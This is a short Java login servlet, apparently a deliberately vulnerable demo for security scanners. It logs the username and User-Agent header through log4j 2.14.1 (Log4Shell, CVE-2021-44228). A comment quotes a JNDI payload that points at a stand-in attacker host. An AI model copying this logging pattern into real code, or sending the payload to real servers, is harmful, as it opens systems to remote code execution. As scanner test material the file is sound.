package com.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.IOException;

// SAST: A03:Injection — Log4Shell / JNDI Injection
// SCA:  log4j-core 2.14.1 → CVE-2021-44228 (CVSS 10.0)
//
// When a user-controlled value such as "${jndi:ldap://attacker.com/x}" is logged,
// log4j performs the JNDI lookup and can load and execute remote code.
public class LoginServlet extends HttpServlet {

    private static final Logger logger = LogManager.getLogger(LoginServlet.class);

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String username  = request.getParameter("username");
        String userAgent = request.getHeader("User-Agent");

        // Logging attacker-controlled input through vulnerable log4j triggers JNDI lookup
        logger.info("Login attempt — user: " + username);
        logger.info("User-Agent: " + userAgent);

        response.getWriter().write("Login processed");
    }
}
